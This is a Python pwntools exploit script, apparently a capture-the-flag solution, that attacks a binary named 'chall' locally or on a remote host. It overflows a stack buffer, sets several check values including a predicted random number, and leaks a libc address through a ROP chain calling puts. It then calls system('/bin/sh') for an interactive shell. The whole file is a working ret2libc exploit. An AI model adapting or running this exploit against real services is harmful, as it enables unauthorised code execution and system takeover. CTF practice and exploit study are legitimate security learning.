from pwn import *

def random():
	out = subprocess.check_output(['./check'])
	out = out.decode().strip().split('\n')
	nums = [int(t.split()[0]) for t in out]
	return nums

elf = ELF('./chall')
context.update(binary=elf)
pop_rdi = 0x401813
ret = 0x40101a

if args.LOCAL:
	p = elf.process()
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
	host = 'gc1.eng.run'
	port = 30259
	p = remote(host, port)
	libc = ELF('./libc.so.6')

p.recvline()

# buffer at rbp - 80
win1 = 6504328519 # rbp - 16
win2_1 = 0xfacefeed # rbp - 24
win2_2 = 0xc0cacede # rbp - 32
win3 = random() # rbp - 40

func = 'puts'

payload = b'A' * 40
payload += p64(win3[0])
payload += p64(win2_2)
payload += p64(win2_1)
payload += p64(win1)
payload += b'A' * (88 - len(payload))
payload += p64(pop_rdi)
payload += p64(elf.got[func])
payload += p64(elf.plt['puts'])
payload += p64(elf.symbols['vuln'])

p.sendline(payload)

leak = u64(p.recvline()[:-1].ljust(8, b'\x00'))
libc.address = leak - libc.symbols[func]
binsh = next(libc.search(b'/bin/sh'))
p.recvline()

log.info(f'Leaked {func}: {hex(leak)}')
log.info(f'Libc base: {hex(libc.address)}')

payload = b'A' * 40
payload += p64(win3[1])
payload += p64(win2_2)
payload += p64(win2_1)
payload += p64(win1)
payload += b'A' * (88 - len(payload))
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(ret)
payload += p64(libc.symbols['system'])
payload += p64(libc.symbols['exit'])

p.sendline(payload)

p.interactive()
p.close()